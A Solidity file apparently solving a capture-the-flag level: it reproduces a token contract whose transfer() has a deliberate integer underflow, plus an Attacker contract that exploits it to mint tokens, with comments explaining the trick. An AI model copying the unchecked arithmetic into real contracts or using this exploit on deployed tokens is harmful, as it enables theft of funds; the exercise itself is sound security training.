// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//The goal of this level is for you to hack the basic token contract below.
// You are given 20 tokens to start with and you will beat the level if 
// you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

// Contract's vulnerability is overflow and underflow

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

// It is even simpeler than I initially thought
// Deploy token contract
// Deploy Attacker contract
// Crux is: the Attacker's contract address has a balance of 0
// balances (0) - value (1) becomes negative and we have underflow: becomes positive (wrap around)
// requirement condition holds 
// balances[to = msg.sender] gets incremented!
contract Attacker {

     Token public attacker ;
    
     constructor(address _tokenContractAddress) public  {
         attacker = Token(_tokenContractAddress);
           attacker.transfer(msg.sender, 1);
     }

   

     

 }